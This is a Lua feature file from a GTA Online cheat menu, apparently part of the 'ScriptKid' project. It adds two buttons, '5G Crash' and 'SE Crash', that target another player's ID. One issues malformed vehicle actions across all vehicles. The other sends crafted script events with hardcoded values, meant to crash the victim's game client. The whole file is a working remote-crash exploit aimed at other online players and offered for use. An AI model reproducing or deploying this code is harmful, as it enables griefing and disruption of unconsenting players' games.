--[[
**  github.com/IMXNOOBX            **
**  Version: 1.1.0       		   **
**  github.com/IMXNOOBX/ScriptKid  **
** 	Devs: aplics#6639, жnoobж#6228 **
]]

local player_features = {
	name = "Crash By aplics & IMXNOOBX",

	MENU:Button('5G Crash', function(but)
		local id = but.page.player_id
		if not id or id == player.index() then return end
		local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(id)
		local allvehicles = pools.get_all_vehicles()
		for i = 1, 3 do
			for i = 1, #allvehicles do
				TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
				TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
				TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
				TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
			end
		end
		utils.notify("Crash | G5", "G5 Crash sent!", gui_icon.boost, notify_type.warning)
	end),
	MENU:Button('SE Crash', function(but)
		local id = but.page.player_id
		if not id or id == player.index() then return end --prevent sending yourself

		script.send(id, -555356783, 0, 1, 21, 118276556, 24659, 23172, -1939067833, -335814060, 86247)
		script.send(id, 526822748, 0, 1, 65620017, 232253469, 121468791, 47805193, 513514473)
		script.send(id, 495813132, 0, 1, 23135423, 3, 3, 4, 827870001, 2022580431, -918761645, 1754244778, 827870001)
		script.send(id, 1348481963, 0, 1, 0, 2, -18386240)

		utils.notify("Crash | SE", "SE Crash sent!", gui_icon.boost, notify_type.warning)
	end)
}

return player_features